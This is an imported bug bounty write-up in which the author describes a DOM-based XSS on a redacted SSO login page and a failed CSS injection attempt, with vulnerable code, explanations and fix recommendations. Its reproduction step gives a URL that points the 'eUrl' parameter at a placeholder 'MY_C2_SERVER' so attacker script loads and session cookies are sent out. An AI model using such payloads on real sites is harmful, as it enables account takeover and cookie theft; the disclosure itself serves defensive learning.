---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-06_full-disclosure-dom-based-xss-and-failures-in-bug-bounty-hunting.md
original_filename: 2023-07-06_full-disclosure-dom-based-xss-and-failures-in-bug-bounty-hunting.md
title: Full Disclosure - DOM-based XSS And Failures In Bug Bounty Hunting
category: documents
detected_topics:
- xss
- csrf
- sso
- command-injection
- api-security
- mobile-security
tags:
- imported
- documents
- xss
- csrf
- sso
- command-injection
- api-security
- mobile-security
language: en
raw_sha256: 06b80061fa9c452236c351afc31e3670d73f8a7ff061723304d457bbae83df70
text_sha256: c31c01c74975236f45b543723effe4776cd7dbb3b6367fce23d25755d443a87b
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# Full Disclosure - DOM-based XSS And Failures In Bug Bounty Hunting

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-06_full-disclosure-dom-based-xss-and-failures-in-bug-bounty-hunting.md
- Source Type: markdown
- Detected Topics: xss, csrf, sso, command-injection, api-security, mobile-security
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `06b80061fa9c452236c351afc31e3670d73f8a7ff061723304d457bbae83df70`
- Text SHA256: `c31c01c74975236f45b543723effe4776cd7dbb3b6367fce23d25755d443a87b`


## Content

---
title: "Full Disclosure - DOM-based XSS And Failures In Bug Bounty Hunting"
page_title: "Full Disclosure - DOM-based XSS And Failures In Bug Bounty Hunting :: kuldeepdotexe's blog"
url: "https://kuldeep.io/posts/fulldisclosure-dom-based-xss/"
final_url: "https://kuldeep.io/posts/fulldisclosure-dom-based-xss/"
authors: ["Kuldeep Pandya (@kuldeepdotexe)"]
bugs: ["DOM XSS", "CSS injection"]
publication_date: "2023-07-06"
added_date: "2023-07-11"
source: "pentester.land/writeups.json"
original_index: 960
---

Hello, folks!

A few days ago, I shared a post on Twitter about a mistake I made while doing bug bounties. This post is about the same mistake and a bonus mistake.

While scrolling on LinkedIn/Twitter/Instagram it is easy to get overwhelmed by looking at other people posting their bounties. There are two ways to look at this: 1. either get encouraged to hack looking at other people’s success or 2. get discouraged and feel bad about you not finding enough vulnerabilities yourself. It is up to us to look at the positive side, take it as inspiration and start working to post similar bounties ourselves.

However, while doing so, it is not guaranteed to find success 100% of the time. Whether you just started hacking or are a seasoned hacker, there will always be challenges.

This time, I found myself in a similar situation. I was hunting on a target for around 6+ hours and found a DOM-based XSS. I escalated it to one-click account takeover. After reporting the issue, I found out that particular domain was out-of-scope.

I spent 1+ hours on crafting the perfect report for this vulnerability but in the end, it didn’t matter. So, I decided to share it in a blog because I’m proud of my report.

After that, I moved on to the next “in-scope” domain. I found a static HTML file and suspected there might be a CSS injection vulnerability. Detailed findings are shown below.

## Findings:⌗

### 1\. DOM XSS In `REDACTED.example.com` Due To Insecure Dynamic Resource Loading Via `eUrl` Parameter⌗

#### Summary:⌗

The URL at <https://REDACTED.example.com/v2/xxx-login.asp> loads static resources dynamically using the `eUrl` parameter that leads to DOM based XSS allowing for a one-click full account takeover.

#### Introduction:⌗

DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

#### Description:⌗

The page in focus <https://REDACTED.example.com/v2/xxx-login.asp> facilitates login functionality using the SSO. It takes the following parameters in input:

Parameter | Working  
---|---  
`action` | Set to either `login` or `register` depending on what user chooses  
`env` | Set to `REDACTED-prod` suggesting this is the production environment  
`eUrl` | This is the most important parameter as it specifies the location to load static resources from  
`userType` | This specifies the user type. By the normal application flow, this is set to `PARTNER`  
`REDACTEDLookupCode` | I’m not entirely sure what this does  
`REDACTEDName` | Set to empty using the normal application flow so I believe it is not much important  
`ssolang` | Language for the SSO. Set to `en` by default  
`REDACTEDUrl` | Again, not entirely sure what this does but doesn’t affect the outcome  
`dossologin` | This is a boolean parameter which is either set to `true` or `false`. It is set to `true` in the case of SSO login  
  
Here, the parameter of utmost importance is the `eUrl` parameter. As it is used to dynamically generate content.

From the source code, we can see that among the below shown lines, the vulnerability exists:
  
  
  var eUrl = decodeURIComponent(urlObj.searchParams.get('eUrl'));
  
  var elementStyleTag = document.createElement('link');
  elementStyleTag.setAttribute('rel', 'stylesheet');
  elementStyleTag.setAttribute('href', eUrl + '/styles.css');
  document.head.appendChild(elementStyleTag);
  
  $(document).ready(function() {
  kendo.ui.progress($("body"), true);
  $.getScript({
  url: eUrl + '/deployment/env/' + env + '.config.js',
  cache: true
  }, function () {
  $.getScript({
  url: eUrl + '/keycloak.js',
  cache: true
  }, function () {
  ...
  // Rest of the code
  

Here is the breakdown of the code:
  
  
  var eUrl = decodeURIComponent(urlObj.searchParams.get('eUrl'));
  

This line retrieves the `eUrl` parameter from the `urlObj`, decodes it using `decodeURIComponent()`, and assigns it to the `eUrl` variable.
  
  
  var elementStyleTag = document.createElement('link');
  elementStyleTag.setAttribute('rel', 'stylesheet');
  elementStyleTag.setAttribute('href', eUrl + '/styles.css');
  document.head.appendChild(elementStyleTag);
  

These lines create a new `link` element, set its `rel` attribute to “stylesheet”, set its `href` attribute to the URL of the stylesheet (which is formed by appending ‘/styles.css’ to `eUrl`), and append this element to the head of the document.
  
  
  $(document).ready(function() {
  kendo.ui.progress($("body"), true);
  $.getScript({
  url: eUrl + '/deployment/env/' + env + '.config.js',
  cache: true
  }, function () {
  $.getScript({
  url: eUrl + '/keycloak.js',
  cache: true
  }, function () {
  ...
  // Rest of the code
  

In this block, jQuery is set to execute when the document is ready. It displays a loading animation and uses the `getScript()` function to fetch and execute two JavaScript files from URLs built using the user-provided` eUrl`.

The vulnerability here lies in the way `eUrl` is used. Since this value comes from the user and is not validated or sanitized before use, an attacker could manipulate this value to point to a malicious script on a different server. When the jQuery `getScript()` function fetches and executes this script, it would run in the context of the user’s session, leading to a DOM-based Cross-Site Scripting (XSS) attack.

Furthermore, `HTTPOnly` flag is not used for the `ASPSESSIONID` cookie which acts as a session cookie. This allows a remote unauthenticated attacker to perform single-click account takeovers.

#### Steps To Reproduce:⌗

  0. To later validate access to session cookies, first visit the following URL: <https://REDACTED.example.com/login.asp>. This will set the `ASPSESSIONID` cookie. This step is optional and its only purpose is to set cookies.
  1. Visit the following URL: [https://REDACTED.example.com/v2/xxx-login.asp?action=login&env=REDACTED-prod&eUrl=https://MY_C2_SERVER/&userType=PARTNER&REDACTEDLookupCode=REDACTED.example.com&REDACTEDName=&ssolang=en&REDACTEDUrl=https://REDACTED.example.com/login.asp&dossologin=true](https://REDACTED.example.com/v2/xxx-login.asp?action=login&env=REDACTED-prod&eUrl=https://MY_C2_SERVER/&userType=PARTNER&REDACTEDLookupCode=REDACTED.example.com&REDACTEDName=&ssolang=en&REDACTEDUrl=https://REDACTED.example.com/login.asp&dossologin=true)
  2. As you open the URL, you will be redirected to my malicious SSO login page. A tech-savvy person will immediately recognize this as a phishing attack. While someone less familiar with such tactics may not.
  3. However, if you check your request logs using Burp Suite, you will notice that your session cookies are already compromised and sent to the attacker’s server.

#### Recommendations⌗

To fix this vulnerability, follow these steps:

  1. **Validate User Inputs** : Always validate user inputs. For `eUrl`, ensure it points to a known, safe domain and doesn’t contain unexpected path or query elements.
  2. **Sanitize User Inputs** : Beyond validation, sanitize user inputs. This can include escaping special characters or using secure functions that perform these tasks automatically.
  3. **Use Allow-lists** : Employ an allow-list approach. Only permit specific, known-good inputs to pass through.
  4. **Implement Content Security Policy (CSP)** : Use Content Security Policy headers to limit the sources from which scripts can be loaded. This can prevent unauthorized script execution.
  5. **Set HTTPOnly Flag** : Apply the `HTTPOnly` flag to the `ASPSESSIONID` cookie. This prevents the cookie from being accessed by client-side scripts, protecting it from theft during an XSS attack.
  6. **Use SameSite Attribute for Cookies** : Set the `SameSite` attribute for the session cookie to `Strict` or `Lax`. This offers extra protection against Cross-Site Request Forgery (CSRF) attacks.
  7. **Regularly Update and Patch** : Keep all software (libraries, frameworks, servers, etc.) up to date. Apply patches promptly as they become available.

#### Supporting Material/References:⌗

  1. Optional login page that is used to set cookies

REDACTED

  2. Phishing page that we made to trick users

REDACTED

  3. Cookies leaked without user knowing

REDACTED

#### Impact⌗

A remote unauthenticated attacker can perform the following actions:

  1. **Launch a Cross-Site Scripting (XSS) attack** : The attacker can manipulate the `eUrl` parameter to point to a malicious script. This script will be fetched and executed within the user’s session when the page loads, giving the attacker the ability to modify the webpage content or perform actions on behalf of the user.
  2. **Steal session cookies** : The `ASPSESSIONID` cookie does not have the `HTTPOnly` flag set, which means it can be accessed by client-side scripts. In the event of a successful XSS attack, this cookie can be stolen, compromising the user’s session.
  3. **Perform account takeover** : With the stolen session cookie, the attacker can impersonate the victim’s session, leading to unauthorized access to the user’s account and potentially any sensitive data or functionalities it contains.
  4. **Conduct harmful actions** : Once the account is taken over, the attacker can perform potentially harmful actions such as changing user settings, sending messages, or making transactions.

All these malicious actions can be performed with just a single click from the user, increasing the risk and ease of the attack.

### 2\. CSS Injection?⌗

While checking a static page of an in-scope application, I came across an interesting JavaScript file.

The code looked like this:
  
  
  const current_url_string = window.location.href;
  const current_url = new URL(current_url_string);
  
  const linkObj = current_url.searchParams.get("link1");
  const userPhotoUrl =
  current_url.searchParams.get("user_photo_url") ||
  decodeDeepLink(linkObj).user_photo_url;
  
  const photoBaseUrl =
  "https://REDACTED.example.com/media/profile-photos";
  
  if (userPhotoUrl && userPhotoUrl.startsWith(photoBaseUrl)) {
  $(".profile-img-placeholder").css(
  "background",
  'url("' + userPhotoUrl + '")'
  );
  }
  

I started to analyze the JavaScript code by manually reading.
  
  
  const current_url_string = window.location.href;
  const current_url = new URL(current_url_string);
  
  const linkObj = current_url.searchParams.get("link1");
  const userPhotoUrl =
  current_url.searchParams.get("user_photo_url") ||
  decodeLink(linkObj).user_photo_url;
  

This subsection retrives the `link1` and `user_photo_url` parameters from the URL. The `user_photo_url` is a direct URL to the user’s profile picture. The other `link1` parameter is a base64 encoded JSON object that is decoded using the `decodeLink()` function.

Here is the working of this function:
  
  
  function decodeDeepLink(str) {
  try {
  return JSON.parse(atob(str));
  } catch (err) {
  return "";
  }
  }
  

After decoding the `link1` parameter, it extracts the value of `user_photo_url` key from the JSON.

The following subsection takes the `user_photo_url` and puts it directly in the CSS of the element having the `.profile-img-placeholder` as the CSS class.
  
  
  if (userPhotoUrl && userPhotoUrl.startsWith(photoBaseUrl)) {
  $(".profile-img-placeholder").css(
  "background",
  'url("' + userPhotoUrl + '")'
  );
  }
  

To set a user-provided value in the CSS of this class, I thought to provide a link like this:

<https://REDACTED.example.com/index.html?link1=eyJ1c2VyX3Bob3RvX3VybCI6ICJodHRwOi8vd3d3LmV4YW1wbGUuY29tIn0=>

When decoded, it becomes this JSON:
  
  
  {
  "user_photo_url": "http://www.example.com"
  }
  

This did not work obviously because I had overlooked a crucial detail. There is a `startsWith(photoBaseUrl)` function that check if the value of `user_photo_url` starts with “[https://REDACTED.example.com/media/profile-photos"](https://REDACTED.example.com/media/profile-photos%22) or not. In my case, it did not. So, no reflections whatsoever in DOM.

Then I used the following URL to trigger the change in DOM:

<https://REDACTED.example.com/index.html?link1=eyJ1c2VyX3Bob3RvX3VybCI6ICJodHRwczovL1JFREFDVEVELmV4YW1wbGUuY29tL21lZGlhL3Byb2ZpbGUtcGhvdG9zIn0=>

The `link1` parameter decodes to this:
  
  
  {
  "user_photo_url": "https://REDACTED.example.com/media/profile-photos"
  }
  

This should trigger the DOM change, right? Wrong! This did not trigger any changes whatsoever.

I kept digging in the code more and more. Almost to the point where I decided to give up. Then, I thought to search in my Burp Suite history about this CSS class `.profile-img-placeholder`. I wanted to see where this class is used so I can better understand the issue.

And as it turns out, there was no element that had this class. The only file where I found this CSS class to be refereced was this very script I was reading. No other references were found even after manually crawling the entire website.

In the future, if the `.profile-img-placeholder` class is added, I’ll be prepared to exploit this vulnerability.

This is it. End of article. Apparantly, not all writeups end with a bounty.

### Conclusion/Takeaways⌗

  1. Always check the scope you’re hacking before and after submitting the report.
  2. Learn a programming language of your choice.
  3. Manually review the source code in order to identify any potential vulnerabilities. With frequent practise, vulnerable code sections are easier to identify revealing potential vulnerabilities.

I work full time as a bug bounty hunter mostly hacking in Synack Red Team (SRT). If you’re interested in becoming a part of the Synack Red Team, feel free to connect with me on Twitter, Instagram, or LinkedIn. I’m always happy to offer guidance to fellow cybersecurity enthusiasts.

Cheers! Adios!
